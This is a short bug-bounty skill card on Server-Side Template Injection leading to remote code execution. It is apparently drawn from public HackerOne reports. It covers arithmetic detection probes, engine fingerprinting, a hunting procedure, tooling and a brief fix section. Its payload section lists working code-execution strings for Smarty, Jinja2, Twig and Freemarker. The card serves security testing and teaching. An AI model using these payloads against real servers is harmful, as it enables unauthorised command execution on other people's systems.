---
name: ssti-smarty-rce
description: Server-Side Template Injection in Smarty/PHP templates leading to RCE. Teaches SSTI detection (polyglot math), engine fingerprinting, and RCE payload construction.
sources: hackerone_public
report_count: 1
---

# SSTI → RCE (Smarty template engine)

**Report**: Unikrn — "SSTI via Smarty template" (hackerone.com/reports/164224). Also Shopify "Return Magic" email template SSTI (#423541), Mail.ru path-traversal+SSTI+RCE (#536130), Glovo SSTI (#1104349).

## Why it matters (the new lesson)
When user input lands in a server-side template, the template engine *evaluates* it — giving code execution, not just HTML injection. The skill is: (1) detect with arithmetic polyglots, (2) fingerprint the engine, (3) pick that engine's RCE payload.

## How it works
```http
GET /?name={{7*7}}          # renders 49  => SSTI
```
Then fingerprint: Smarty `{$smarty.version}`, Jinja `{{7*'7'}}`, Twig `{{_self.env}}`, Freemarker `${7*7}`, Velocity `#set`, ERB `<%= 7*7 %>`. Then escalate with the engine's code-exec syntax.

## How to hunt for it
1. Inject `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `[[7*7]]` into every reflected field (name, message, template params, email templates).
2. On arithmetic evaluation, fingerprint and escalate.

## Payloads (RCE)
```
Smarty:  {system('id')}   {passthru('id')}   {$smarty.version}
Jinja2:  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
Twig:    {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## Tooling
- `tplmap`, Burp Intruder with polyglot lists, manual engine fingerprinting.

## Fix
Never let user input reach a template; use sandboxed template engines with autoescaping; restrict template/context variables.
